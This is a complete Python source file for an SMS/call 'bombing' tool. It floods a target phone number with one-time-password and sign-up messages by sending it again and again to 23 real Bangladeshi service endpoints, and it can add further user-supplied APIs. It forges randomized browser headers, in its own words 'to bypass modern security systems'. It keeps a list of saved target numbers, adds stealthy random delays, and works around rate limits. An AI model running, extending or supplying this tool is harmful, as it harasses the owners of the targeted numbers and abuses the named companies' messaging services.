import json
import asyncio
import aiohttp
import random
import string
import os
import sys
import logging
import re
from datetime import datetime
from contextvars import ContextVar
from urllib.parse import urlparse

# Colors
R, G, Y, B, P, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m', '\033[1;37m'

current_api_fmt = ContextVar("current_api_fmt", default=None)
VERSION = '1.1.5'
facebook_url = 'https://www.facebook.com/taissuuu?'
github = 'https://github.com/Quincunx33'

class NumberFormatter:
    @staticmethod
    def format(number, format_type):
        if len(number) == 11 and number.startswith('0'):
            if format_type == 'no_zero': return number[1:]
            if format_type == '880': return '88' + number
            if format_type == '+880': return '+88' + number
        return number

class SmartAPIController:
    def __init__(self):
        self.api_data_file = "api_learning_data.json"
        self.learning_data = self.load_learning_data()
        self.formats = ['raw', '880', '+880']  # Improved list
        self.exploring = {}  # Track APIs in exploration mode
        self.format_queue = {}  # Queue of formats to try
        self.cooldowns = {}

    def load_learning_data(self):
        if os.path.exists(self.api_data_file):
            try:
                with open(self.api_data_file, "r") as f:
                    return json.load(f)
            except:
                pass
        return {}

    def save_learning_data(self):
        with open(self.api_data_file, "w") as f:
            json.dump(self.learning_data, f, indent=4)

    def get_format(self, api_name):
        """Returns the best format. If unknown, explores different formats."""
        if api_name in self.cooldowns:
            if asyncio.get_event_loop().time() < self.cooldowns[api_name]:
                return None  # Blocked
            else:
                del self.cooldowns[api_name]

        # Use learned format if available
        if api_name in self.learning_data:
            return self.learning_data[api_name]['best_format']

        # Setup exploration for new API
        if api_name not in self.exploring:
            f_list = self.formats.copy()
            random.shuffle(f_list)
            self.format_queue[api_name] = f_list
            self.exploring[api_name] = True

        # Try next format in queue
        if api_name in self.format_queue and self.format_queue[api_name]:
            return self.format_queue[api_name].pop(0)
        else:
            # All formats failed or queue empty, default to raw
            return 'raw'

    def report_result(self, api_name, format_used, success, status_code):
        if success and status_code in [200, 201]:
            # Learn successful format
            self.learning_data[api_name] = {'best_format': format_used}
            self.save_learning_data()
            # Stop exploration
            self.exploring.pop(api_name, None)
            self.format_queue.pop(api_name, None)
        elif status_code == 429:
            # Block for 300 seconds on rate limit
            self.cooldowns[api_name] = asyncio.get_event_loop().time() + 300
            self.exploring.pop(api_name, None)
            self.format_queue.pop(api_name, None)
        # For other failures, exploration continues with the next format in get_format()

    def is_blocked(self, api_name):
        if api_name in self.cooldowns:
            if asyncio.get_event_loop().time() < self.cooldowns[api_name]:
                return True
            else:
                del self.cooldowns[api_name]
        return False

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    placeholders = [R, G, C, Y, P, B]
    sc = random.choice(placeholders)
    logo = rf'''{sc}                                                    
                    _.:._
                  ."\ | /".
{R}.,__              "=.\:/.="              {R}__,.
 {R}"=.`"=._{G}            /^\            {R}_.="`.="
   ".'.'."{B}=.=.=.=.-,/   \,-{B}.=.=.=.=".{sc}'.'."
     `~.`.{P}`.`.`.`.`.     .'.'.'.'.'.'{sc}.~`
        `~.`` {P}` `{sc}.`.\   /.'{P}.' ' ''{sc}.~`
            `=.-~~-._ ) ( _.-~~-.=`
                    `\ /`
                     ( )
                      Y

{R}SMS/Call{W} {G}Bombing{W}, and {G}Smart Learning{W}, and {G}Dynamic Payload{W} with {G}Stealth Mode{W}.
'''
    print(logo)
    print(f'{G}[+] {C}Version     : {W}{VERSION}')
    print(f'{G}[+] {C}Created By  : {W}tasfiya')
    print(f'{G}[+] {C}Facebook    : {W}{facebook_url}')
    print(f'{G}[+] {C}Github      : {W}{github}')
    print(f'____________________________________________________________________________\n')
    print(f'{B}[~] {R}Note :{G} Smart Learning system enabled. API formats will be learned automatically.{W}\n')

def generate_dynamic_ua():
    platforms = ['Windows', 'Android', 'iOS', 'macOS', 'Linux']
    platform = random.choice(platforms)
    chrome_v = f"{random.randint(130, 135)}.0.{random.randint(6000, 7000)}.{random.randint(10, 150)}"
    webkit_v = "537.36"
    
    if platform == 'Windows':
        win_v = random.choice(['10.0', '11.0'])
        arch = random.choice(['Win64; x64', 'WOW64'])
        return f"Mozilla/5.0 (Windows NT {win_v}; {arch}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v}"
    elif platform == 'Android':
        android_v = random.randint(11, 15)
        model = random.choice(['SM-S928B', 'SM-G991B', 'Pixel 8 Pro', 'Pixel 9 Pro XL', 'Xiaomi 14 Ultra', 'CPH2451', 'M2101K6G'])
        return f"Mozilla/5.0 (Linux; Android {android_v}; {model}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Mobile Safari/{webkit_v}"
    elif platform == 'iOS':
        ios_v = random.choice(['16_6', '17_4_1', '17_5', '18_0', '18_1'])
        device = random.choice(['iPhone', 'iPad'])
        return f"Mozilla/5.0 ({device}; CPU iPhone OS {ios_v} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ios_v.split('_')[0]}.0 Mobile/15E148 Safari/604.1"
    elif platform == 'macOS':
        mac_v = random.choice(['10_15_7', '11_6', '12_5', '13_4', '14_1'])
        return f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mac_v}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v}"
    else: # Linux
        return f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v}"

def get_random_name():
    return ''.join(random.choices(string.ascii_letters, k=8))

def get_random_email():
    return f"{get_random_name()}@gmail.com"

def get_random_phone():
    return "01" + "".join(random.choices(string.digits, k=9))

# --- New Features: Save System & Settings ---

DATA_FILE = "bomber_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {"saved_numbers": {}, "settings": {"stealth_mode": False, "external_only": False}}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def save_number(name, number):
    data = load_data()
    data["saved_numbers"][name] = number
    save_data(data)
    logging.info(f"{G}[✓] Number saved successfully!{W}")

def list_saved_numbers():
    data = load_data()
    numbers = data.get("saved_numbers", {})
    if not numbers:
        print(f"{R}[!] No saved numbers found.{W}")
        input(f"\n{C}Press Enter to return...{W}")
        return None
    
    print(f"\n{Y}--- Saved Numbers ---{W}")
    keys = list(numbers.keys())
    for i, name in enumerate(keys, 1):
        print(f"{C}[{i}] {name}: {numbers[name]}{W}")
    
    choice = input(f"\n{Y}[?] Select a number (or 'b' to go back): {W}")
    if choice.lower() == 'b':
        return None
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(keys):
            return numbers[keys[idx]]
    except:
        pass
    return None

async def settings_menu():
    while True:
        clear()
        banner()
        data = load_data()
        settings = data.get("settings", {})
        
        stealth_status = f"{G}ON{W}" if settings.get("stealth_mode") else f"{R}OFF{W}"
        external_only_status = f"{G}ON{W}" if settings.get("external_only") else f"{R}OFF{W}"
        
        print(f"{Y}--- Settings ---{W}")
        print(f"{C}[1] Stealth Mode: {stealth_status}")
        print(f"{C}[2] External API Only: {external_only_status} {Y}(Disable Internal APIs){W}")
        print(f"{C}[3] Clear Saved Numbers")
        print(f"{C}[4] Manage External APIs")
        print(f"{C}[B] Back to Main Menu")
        
        choice = input(f"\n{Y}[?] Select Option: {W}").lower()
        
        if choice == '1':
            settings["stealth_mode"] = not settings.get("stealth_mode")
        elif choice == '2':
            settings["external_only"] = not settings.get("external_only")
        elif choice == '3':
            confirm = input(f"{R}[!] Are you sure you want to clear all saved numbers? (y/n): {W}").lower()
            if confirm == 'y':
                data["saved_numbers"] = {}
                logging.info(f"{G}[✓] All numbers cleared!{W}")
                await asyncio.sleep(1)
        elif choice == '4':
            await manage_external_apis()
        elif choice == 'b':
            break
        
        data["settings"] = settings
        save_data(data)

async def manage_external_apis():
    file_path = "external_apis.json"
    while True:
        clear()
        banner()
        if os.path.exists(file_path):
            try:
                with open(file_path, "r") as f:
                    apis = json.load(f)
            except:
                apis = []
        else:
            apis = []
            
        print(f"{Y}--- External API Management ---{W}")
        if not apis:
            print(f"{R}[!] No external APIs configured.{W}")
        else:
            for i, api in enumerate(apis, 1):
                status = f"{G}[Connected]{W}" if api.get("enabled", True) else f"{R}[Disconnected]{W}"
                print(f"{C}[{i}] {api.get('name')} {status}")
                print(f"    {W}URL: {api.get('url')}")
                print(f"    {W}Method: {api.get('method')} | Mode: {api.get('mode')}")
                if api.get("payload"):
                    print(f"    {W}Payload: {json.dumps(api.get('payload'))}")
                print("-" * 40)
        
        print(f"{G}[A] Add New API")
        print(f"{R}[D] Delete API")
        print(f"{Y}[T] Toggle Connect/Disconnect")
        print(f"{B}[B] Back")
        
        choice = input(f"{Y}[?] Select Option: {W}").lower()
        
        if choice == 'a':
            name = input(f"{C}[?] API Name: {W}")
            url = input(f"{C}[?] API URL (use {{phone}} for target): {W}")
            method = input(f"{C}[?] Method (GET/POST, default POST): {W}").upper() or "POST"
            mode = input(f"{C}[?] Mode (sms/call, default sms): {W}").lower() or "sms"
            
            payload = {}
            if method == "POST":
                print(f"{Y}[*] Enter JSON payload (e.g. {{\"phone\": \"{{phone}}\"}}). Leave empty for none.{W}")
                p_input = input(f"{C}[?] Payload: {W}")
                if p_input:
                    try:
                        payload = json.loads(p_input)
                    except:
                        print(f"{R}[!] Invalid JSON. Using empty payload.{W}")
            
            apis.append({
                "name": name,
                "url": url,
                "method": method,
                "mode": mode,
                "payload": payload,
                "enabled": True
            })
            with open(file_path, "w") as f:
                json.dump(apis, f, indent=4)
            print(f"{G}[✓] API Added!{W}")
            await asyncio.sleep(1)
            
        elif choice == 'd':
            if not apis: continue
            idx = input(f"{R}[?] Enter API number to delete: {W}")
            try:
                idx = int(idx) - 1
                if 0 <= idx < len(apis):
                    del apis[idx]
                    with open(file_path, "w") as f:
                        json.dump(apis, f, indent=4)
                    print(f"{G}[✓] API Deleted!{W}")
                else:
                    print(f"{R}[!] Invalid number.{W}")
            except:
                pass
            await asyncio.sleep(1)
            
        elif choice == 't':
            if not apis: continue
            idx = input(f"{Y}[?] Enter API number to toggle: {W}")
            try:
                idx = int(idx) - 1
                if 0 <= idx < len(apis):
                    apis[idx]["enabled"] = not apis[idx].get("enabled", True)
                    with open(file_path, "w") as f:
                        json.dump(apis, f, indent=4)
                    status = "Connected" if apis[idx]["enabled"] else "Disconnected"
                    print(f"{G}[✓] API {status}!{W}")
                else:
                    print(f"{R}[!] Invalid number.{W}")
            except:
                pass
            await asyncio.sleep(1)
            
        elif choice == 'b':
            break






def smart_api(func):
    async def wrapper(self, *args, **kwargs):
        parts = func.__name__.split('___')
        if len(parts) > 1:
            api_id = parts[0].replace('api_', '').upper()
            api_name_part = parts[1].replace('_', ' ').title()
            display_name = f'{api_id} - {api_name_part}'
        else:
            display_name = func.__name__

        if self.smart.is_blocked(display_name):
            return False
            
        fmt = self.smart.get_format(display_name)
        original_target = self.target
        self.target = NumberFormatter.format(original_target, fmt)
        
        token = current_api_fmt.set(fmt)
        try:
            result = await func(self, *args, **kwargs)
            return result
        finally:
            self.target = original_target
            current_api_fmt.reset(token)
    return wrapper


class AsyncBomber:
    def __init__(self, target, limit, mode='sms', stop_event=None, concurrency=50):
        self.target = target
        self.limit = limit # 0 means infinite
        self.mode = mode
        self.sent = 0
        self.failed = 0
        self.running = True
        self.stop_event = stop_event if stop_event else asyncio.Event()
        self.log_file = f"bombing_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.session = None # aiohttp session will be created later
        self.api_cooldowns = {} # Tracks cooldown for each API
        self.backoff_time = 30 # Initial backoff time in seconds
        self.request_batch_duration = 120 # Time in seconds to send requests before resting (2 minutes)
        self.rest_duration = 10 # Time in seconds to rest after a batch
        self.semaphore = asyncio.Semaphore(concurrency) # Limit concurrent requests to 10
        self.smart = SmartAPIController()
        self.external_apis = self.load_external_apis()

        with open(self.log_file, "w") as f:
            f.write(f"Bombing Session Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target: {self.target} | Mode: {self.mode.upper()}\n")
            f.write("-" * 60 + "\n")

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()

    def load_external_apis(self):
        file_path = "external_apis.json"
        if os.path.exists(file_path):
            try:
                with open(file_path, "r") as f:
                    return json.load(f)
            except Exception as e:
                logging.error(f"Error loading external APIs: {e}")
        return []

    async def run_external_api(self, api_config):
        name = api_config.get("name", "Unknown External API")
        url = api_config.get("url", "").replace("{phone}", self.target)
        method = api_config.get("method", "POST").upper()
        payload_template = api_config.get("payload", {})
        extra_headers = api_config.get("headers", {})

        # Prepare payload by replacing {phone}
        payload = {}
        if isinstance(payload_template, dict):
            for k, v in payload_template.items():
                if isinstance(v, str):
                    payload[k] = v.replace("{phone}", self.target)
                else:
                    payload[k] = v
        
        try:
            headers = self.get_headers(url, extra=extra_headers)
            if method == "GET":
                async with self.session.get(url, headers=headers, timeout=10) as res:
                    res_text = await res.text()
                    success = res.status in [200, 201]
                    await self.log_event(f"[EXT] {name}", success, res.status, response_text=res_text)
                    return success
            else:
                async with self.session.post(url, json=payload, headers=headers, timeout=10) as res:
                    res_text = await res.text()
                    success = res.status in [200, 201]
                    await self.log_event(f"[EXT] {name}", success, res.status, response_text=res_text)
                    return success
        except Exception as e:
            await self.log_event(f"[EXT] {name}", False, "Error", response_text=str(e))
            return False

    def get_headers(self, url=None, extra=None):
        """Generates advanced, dynamic, and platform-specific headers to bypass modern security systems."""
        user_agent = generate_dynamic_ua()
        
        # Determine platform and browser for Sec-Ch-Ua
        platform = "Unknown"
        if "iPhone" in user_agent or "iPad" in user_agent: platform = "iOS"
        elif "Android" in user_agent: platform = "Android"
        elif "Windows NT" in user_agent: platform = "Windows"
        elif "Macintosh" in user_agent: platform = "macOS"
        elif "Linux" in user_agent: platform = "Linux"

        # Extract major version from UA for Sec-Ch-Ua
        chrome_match = re.search(r'Chrome/(\d+)', user_agent)
        chrome_v = chrome_match.group(1) if chrome_match else "132"

        # Generate advanced Client-Hints
        sec_ch_ua = f'"Not_A Brand";v="8", "Chromium";v="{chrome_v}", "Google Chrome";v="{chrome_v}"'
        sec_ch_ua_mobile = "?1" if platform in ["iOS", "Android"] else "?0"
        sec_ch_ua_platform = f'"{platform}"'

        headers = {
            "User-Agent": user_agent,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-US,en;q=0.9,bn;q=0.8", "bn-BD,bn;q=0.9,en-US;q=0.8,en;q=0.7"]),
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json; charset=UTF-8",
            "Connection": "keep-alive",
            "Sec-Ch-Ua": sec_ch_ua,
            "Sec-Ch-Ua-Mobile": sec_ch_ua_mobile,
            "Sec-Ch-Ua-Platform": sec_ch_ua_platform,
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site" if url and "facebook.com" not in url else "cross-site",
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        if url:
            parsed = urlparse(url)
            headers["Host"] = parsed.netloc
            headers["Origin"] = f"{parsed.scheme}://{parsed.netloc}"
            headers["Referer"] = f"{parsed.scheme}://{parsed.netloc}/"

        if extra:
            headers.update(extra)
            
        return headers
    async def log_event(self, api_name, success, status_code=None, fmt=None, response_text=None):
        # Improved success detection: check for common failure keywords in response body
        if success and response_text:
            failure_keywords = ["failed", "error", "invalid", "limit", "wrong", "denied", "blocked", "unauthorized", "forbidden"]
            if any(kw in response_text.lower() for kw in failure_keywords):
                success = False
                status_code = f"FakeSuccess({status_code})"

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        status = f"{G}SUCCESS{W}" if success else f"{R}FAILED{W}"
        
        # Enhanced log entry with more details
        log_entry = f"[{timestamp}] API: {api_name:20} | Status: {status:15} | Code: {status_code:10} | Format: {str(fmt):10}\n"
        if response_text and not success:
            log_entry += f"    Response: {response_text[:100]}...\n"

        with open(self.log_file, "a") as f:
            f.write(log_entry)

        if success:
            self.sent += 1
            if fmt is not None: self.smart.report_result(api_name, fmt, True, status_code)
            color = G
            icon = "✓"
        else:
            self.failed += 1
            if fmt is not None: self.smart.report_result(api_name, fmt, False, status_code)
            color = R
            icon = "✗"
            
        # Display to console with enhanced formatting
        print(f"{W}[{timestamp}] {color}[{icon}] {api_name:20} {W}| {color}{status:7} {W}| Code: {Y}{status_code}{W}")
            
        # Add to cooldown if failed
        if not success and status_code and status_code != "Error":
            self.api_cooldowns[api_name.lower()] = asyncio.get_event_loop().time() + 60


    async def bomb_task(self):
        """Main task that selects and runs APIs in a loop."""
        api_methods = [getattr(self, m) for m in dir(self) if m.startswith('api_')]
        if not api_methods:
            logging.error(f"{R}[!] No APIs found to run!{W}")
            return

        start_time = asyncio.get_event_loop().time()
        
        while self.running and (self.limit == 0 or self.sent < self.limit):
            if self.stop_event.is_set():
                break
                
            # Check for rest duration
            current_time = asyncio.get_event_loop().time()
            if current_time - start_time > self.request_batch_duration:
                logging.info(f"{Y}[*] Resting for {self.rest_duration} seconds...{W}")
                await asyncio.sleep(self.rest_duration)
                start_time = asyncio.get_event_loop().time()

            # Randomly select an API
            method = random.choice(api_methods)
            api_name = method.__name__
            
            # Check cooldown
            if api_name.lower() in self.api_cooldowns:
                if current_time < self.api_cooldowns[api_name.lower()]:
                    continue
                else:
                    del self.api_cooldowns[api_name.lower()]

            async with self.semaphore:
                try:
                    await method()
                except Exception as e:
                    logging.debug(f"Error running {api_name}: {e}")
            
            # Small delay between requests to be stealthy
            await asyncio.sleep(random.uniform(0.5, 2.0))
    # SMS APIs

    @smart_api
    async def api_api_new_1(self):
        target = self.target
        url = "https://www.shwapno.com/api/auth".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_1 - www.shwapno.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_1 - www.shwapno.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_2(self):
        target = self.target
        url = "https://api.chardike.com/api/chardike-login-need".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_2 - api.chardike.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_2 - api.chardike.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_3(self):
        target = self.target
        url = "https://api.medeasy.health/api/send-otp/{phone}/".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_3 - api.medeasy.health", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_3 - api.medeasy.health", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_4(self):
        target = self.target
        url = "https://api.sumashtech.com/api/check-user-exists".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_4 - api.sumashtech.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_4 - api.sumashtech.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_5(self):
        target = self.target
        url = "https://apiv1.bdtickets.com/api/v1/auth/otp/send".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_5 - apiv1.bdtickets.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_5 - apiv1.bdtickets.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_6(self):
        target = self.target
        url = "https://bb-api.bohubrihi.com/public/activity/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_6 - bb-api.bohubrihi.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_6 - bb-api.bohubrihi.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_7(self):
        target = self.target
        url = "https://billing.proiojon.com/api/v1/auth/sign-up".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_7 - billing.proiojon.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_7 - billing.proiojon.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_8(self):
        target = self.target
        url = "https://api.volthbd.com/api/v1/auth/registrations".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_8 - api.volthbd.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_8 - api.volthbd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_9(self):
        target = self.target
        url = "https://doctorlivebd.com/api/patient/auth/otpsend".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_9 - doctorlivebd.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_9 - doctorlivebd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_10(self):
        target = self.target
        url = "https://doctorlivebd.com/api/patient/auth/sendotp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_10 - doctorlivebd.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_10 - doctorlivebd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_11(self):
        target = self.target
        url = "https://reseller.circle.com.bd/api/v2/auth/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_11 - reseller.circle.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_11 - reseller.circle.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_12(self):
        target = self.target
        url = "https://backend.sailor.clothing/api/v2/auth/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_12 - backend.sailor.clothing", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_12 - backend.sailor.clothing", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_13(self):
        target = self.target
        url = "https://coreapi.shadhinmusic.com/api/v5/otp/otpreq".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_13 - coreapi.shadhinmusic.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_13 - coreapi.shadhinmusic.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_14(self):
        target = self.target
        url = "https://ultimateasiteapi.com/api/register-customer".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_14 - ultimateasiteapi.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_14 - ultimateasiteapi.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_15(self):
        target = self.target
        url = "https://webapi.robi.com.bd/v1/account/register/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_15 - webapi.robi.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_15 - webapi.robi.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_16(self):
        target = self.target
        url = "https://www.8mbets.net/api/user/new-mobile-request".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_16 - www.8mbets.net", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_16 - www.8mbets.net", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_17(self):
        target = self.target
        url = "https://www.8mbets.net/api/user/request-forget-tac".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_17 - www.8mbets.net", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_17 - www.8mbets.net", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_18(self):
        target = self.target
        url = "https://www.aarong.com/api/auth/generate-token-web".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_18 - www.aarong.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_18 - www.aarong.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_19(self):
        target = self.target
        url = "https://www.salextra.com.bd/register?returnUrl=%2F".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_19 - www.salextra.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_19 - www.salextra.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_20(self):
        target = self.target
        url = "https://admin.beautybooth.com.bd/api/v2/auth/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_20 - admin.beautybooth.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_20 - admin.beautybooth.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_21(self):
        target = self.target
        url = "https://chokrojan.com/api/v1/passenger/login/mobile".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_21 - chokrojan.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_21 - chokrojan.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_22(self):
        target = self.target
        url = "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_22 - apibeta.iqra-live.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_22 - apibeta.iqra-live.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_23(self):
        target = self.target
        url = "https://backend.timezonebd.com/api/v1/user/otp-login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_23 - backend.timezonebd.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_23 - backend.timezonebd.com", False, "Error", fmt=current_api_fmt.get())
            return False

